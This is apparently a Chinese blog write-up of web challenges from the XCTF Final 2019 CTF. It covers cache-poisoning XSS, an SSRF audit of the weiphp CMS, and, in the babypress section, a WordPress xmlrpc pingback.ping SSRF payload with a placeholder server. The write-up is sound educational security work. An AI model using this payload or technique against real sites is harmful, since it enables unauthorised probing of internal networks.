<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。\n"><title>XCTF Final 2019 Web Write Up</title>
<link rel=canonical href=https://zeddyu.github.io/p/xctf-final-2019-web-write-up/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="XCTF Final 2019 Web Write Up"><meta property='og:description' content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。\n"><meta property='og:url' content='https://zeddyu.github.io/p/xctf-final-2019-web-write-up/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2019-11-14T00:02:53+00:00'><meta property='article:modified_time' content='2019-11-14T00:02:53+00:00'><meta name=twitter:title content="XCTF Final 2019 Web Write Up"><meta name=twitter:description content="我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zdy.one/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#babyblog>babyblog</a></li><li><a href=#babypress>babypress</a></li><li><a href=#weiphp>weiphp</a><ol><li><a href=#ssrf>SSRF</a></li><li><a href=#upload>upload</a></li></ol></li><li><a href=#lfi2019>lfi2019</a><ol><li><a href=#trick-1>Trick 1</a></li><li><a href=#trick-2>Trick 2</a></li></ol></li><li><a href=#noxss>noxss</a></li><li><a href=#tfboys>tfboys</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#ce0000;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/xctf-final-2019-web-write-up/>XCTF Final 2019 Web Write Up</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 14, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>11 minute read</time></div><div class=article-readmore><a href=/p/xctf-final-2019-web-write-up/>Read More…</a></div></footer></div></header><section class=article-content><p>我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。</p><p>[TOC]</p><h1 id=web>Web</h1><h2 id=babyblog>babyblog</h2><p>界面跟 Byte CTF 的 <a class=link href=https://zeddyu.github.io/2019/09/17/bytectf2019/#babyblog target=_blank rel=noopener>babyblog</a> 一致，有些功能还保留着，很有误导性&mldr;以为是个升级版，前者是一道二次注入后用 php 正则<code>/e</code>特性来执行命令的，所以我们一开始也就一直在日注入了&mldr;</p><p>后来我发现<code>/user</code>个人界面有 ip 记录，于是尝试 XFF 注入无果，但是可以把 XFF 直接回显到页面上。发现<code>/server_status</code>，发现有大家的访问记录。陷入思考ing&mldr;</p><p>队友突然看到有一个访问记录<code>/user/1.css</code>（类似的这么一个路由，不太想得起来了），马上想到可能是缓存投毒，联想跟上文说的 XFF 的设置，想到可以缓存投毒将反射 xss 变成缓存 xss ，这样就可以打到 admin 了。</p><p><img src=https://blogpic.zdy.one/img/20191109012449.png loading=lazy></p><h2 id=babypress>babypress</h2><p>这题比较狗血&mldr;前一天给了两个 hint :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>first hint for babypress: ssrf n-day exploit on the internet will not work
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>second hint: if you can exploit in your local, it should be possible to exploit in remote.
</span></span></code></pre></td></tr></table></div></div><p>随便搜一下我们大概可以知道 ssrf n-day 是通过 <code>xmlrpc.php</code> 这个文件来打内网的，然后当晚我们通过<code>xmlrpc.php</code>成功进行了 SSRF ，当看到了这两个 hint &mldr;我们就感觉不妙，应该打的不是我们这个， but 我们确实打成功了呀&mldr;于是我们当晚又加了一会班，当时最新版本是 5.2.4 ，于是我们找到 5.2.4 的 <a class=link href=https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ target=_blank rel=noopener>security issue</a>，然后找到了<a class=link href=https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2 target=_blank rel=noopener>更新补丁</a>，但是感觉绕不过&mldr;以为是个新的绕过方式啥的&mldr;</p><p>好了，结果到了第二天一开始没人打成功&mldr;后来，到了差不多中午主办方又发公告更换环境，当时我们都在看另一个题，也就没管，结果一会有两个队出了&mldr;然后我们试了一下昨晚我们打<code>xmlrpc.php</code>的，就成了&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;methodCall&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;methodName&gt;</span>pingback.ping<span class=nt>&lt;/methodName&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;params&gt;&lt;param&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;value&gt;&lt;string&gt;</span>http://<span class=nt>&lt;YOUR</span> <span class=err>SERVER</span> <span class=nt>&gt;</span>:<span class=nt>&lt;port&gt;&lt;/string&gt;&lt;/value&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;</span>http://<span class=nt>&lt;SOME</span> <span class=err>VALID</span> <span class=err>BLOG</span> <span class=err>FROM</span> <span class=err>THE</span> <span class=err>SITE</span> <span class=nt>&gt;&lt;/string&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/methodCall&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>主要就是要发一个评论以及更改一下第二个参数为他的 host 才行&mldr;这题也没啥好说的&mldr;感觉全场唯一的槽点(Web)就是这个了。</p><h2 id=weiphp>weiphp</h2><p>一个叫 weiphp 的 CMS 审计，这个主要是队友看的，我当时做另外一道题去了。我们出的是一个 ssrf 的地方，赛后问了出的师傅，是审了上传的地方。</p><h3 id=ssrf>SSRF</h3><p>我们全局搜<code>curl</code>，可以在 Base.php 中发现有以下代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=nv>$type</span> <span class=o>=</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span> <span class=nv>$return_array</span> <span class=o>=</span> <span class=k>true</span><span class=p>,</span> <span class=nv>$useCert</span> <span class=o>=</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$res</span> <span class=o>=</span> <span class=nx>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=nv>$type</span><span class=p>,</span> <span class=nv>$return_array</span><span class=p>,</span> <span class=nv>$useCert</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// 各种常见错误判断
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_erron&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_erron&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;: &#39;</span> <span class=o>.</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;curl_error&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$return_array</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;errcode&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;errcode&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nx>error_msg</span><span class=p>(</span><span class=nv>$res</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;FAIL&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_msg&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;return_msg&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;result_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;result_code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;FAIL&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code_des&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;: &#39;</span> <span class=o>.</span> <span class=nv>$res</span><span class=p>[</span><span class=s1>&#39;err_code_des&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>跟进第三行的<code>post_data</code>，我们可以在 common.php 中找到该函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>post_data</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nv>$param</span> <span class=o>=</span> <span class=p>[],</span> <span class=nv>$type</span> <span class=o>=</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span> <span class=nv>$return_array</span> <span class=o>=</span> <span class=k>true</span><span class=p>,</span> <span class=nv>$useCert</span> <span class=o>=</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$has_json</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;json&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$param</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$has_json</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$param</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$param</span><span class=p>,</span> <span class=nx>JSON_UNESCAPED_UNICODE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>==</span> <span class=s1>&#39;xml&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$param</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$param</span> <span class=o>=</span> <span class=nx>ToXml</span><span class=p>(</span><span class=nv>$param</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 初始化curl
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$type</span> <span class=o>!=</span> <span class=s1>&#39;file&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>add_debug_log</span><span class=p>(</span><span class=nv>$param</span><span class=p>,</span> <span class=s1>&#39;post_data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 设置超时
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_TIMEOUT</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 设置超时
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_TIMEOUT</span><span class=p>,</span> <span class=mi>180</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
